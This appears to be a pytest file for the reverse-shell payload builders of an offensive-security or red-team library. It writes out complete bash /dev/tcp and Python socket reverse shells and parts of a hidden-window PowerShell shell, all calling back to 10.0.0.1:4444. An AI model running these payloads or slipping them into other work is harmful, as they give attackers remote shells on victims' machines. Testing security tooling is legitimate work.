"""Tests for the C2 payload builders in :mod:`ofx.lib.c2`."""

from __future__ import annotations

import pytest

from ofx.lib.c2 import (
    bash_reverse_shell,
    java_reverse_shell,
    perl_reverse_shell,
    php_reverse_shell,
    powershell_reverse_shell,
    python_reverse_shell,
    ruby_reverse_shell,
    socat_reverse_shell,
)

LHOST = "10.0.0.1"
LPORT = 4444

BUILDERS = (
    bash_reverse_shell,
    powershell_reverse_shell,
    python_reverse_shell,
    perl_reverse_shell,
    ruby_reverse_shell,
    php_reverse_shell,
    socat_reverse_shell,
    java_reverse_shell,
)


@pytest.mark.parametrize("builder", BUILDERS, ids=lambda fn: fn.__name__)
def test_builder_embeds_callback_host_and_port(builder) -> None:
    payload = builder(LHOST, LPORT)

    assert LHOST in payload
    assert str(LPORT) in payload


def test_bash_reverse_shell_payload_is_exact() -> None:
    assert (
        bash_reverse_shell(LHOST, LPORT)
        == "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
    )


def test_python_reverse_shell_payload_is_quoted_correctly() -> None:
    payload = python_reverse_shell(LHOST, LPORT)

    assert payload == (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect(('10.0.0.1',4444));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call(['/bin/sh','-i'])'"
    )


def test_powershell_reverse_shell_keeps_literal_scripting_braces() -> None:
    """Regression: ``str.format`` used to consume PowerShell braces and crash.

    The builder interpolates host/port only; every PowerShell scripting brace
    (``%{0}``, ``while(...){``) must survive verbatim.
    """
    payload = powershell_reverse_shell(LHOST, LPORT)

    assert payload.startswith('powershell -nop -w hidden -c "')
    assert payload.endswith('"')
    assert "TCPClient('10.0.0.1',4444)" in payload
    assert "%{0}" in payload
    assert "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){" in payload
    assert "$client.Close()" in payload


def test_powershell_reverse_shell_segments_joined_with_single_space() -> None:
    payload = powershell_reverse_shell(LHOST, LPORT)

    assert "  " not in payload
    assert "$client.GetStream()" in payload
    assert "$bytes.GetStream" not in payload
